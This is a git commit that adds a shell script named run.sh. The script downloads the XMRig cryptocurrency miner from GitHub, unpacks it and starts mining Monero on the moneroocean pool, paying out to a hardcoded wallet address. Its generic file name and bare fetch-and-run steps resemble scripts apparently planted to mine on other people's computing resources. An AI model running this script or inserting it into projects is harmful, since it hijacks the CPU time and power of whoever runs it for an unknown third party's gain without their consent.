fbbcf3c0e22c26b6a9a0a57a6c2d23fce08b6504
Shalinda Lakshan <109817736+nonamehereilp@users.noreply.github.com>
2024-06-23 08:51:11 +0530

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,3 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar -xf xmrig-6.21.1-linux-x64.tar.gz
+cd xmrig-6.21.1
+./xmrig -o gulf.moneroocean.stream:10128 -u 42oKb3UsBR4FArpe4EwQRXMFPQMS7iXgtZZepEuAcrt2KU6hXpUVeejHdb6tfbPTKW1f3NBCM9GxsdC3YRz7v1RMEQZ8Zho
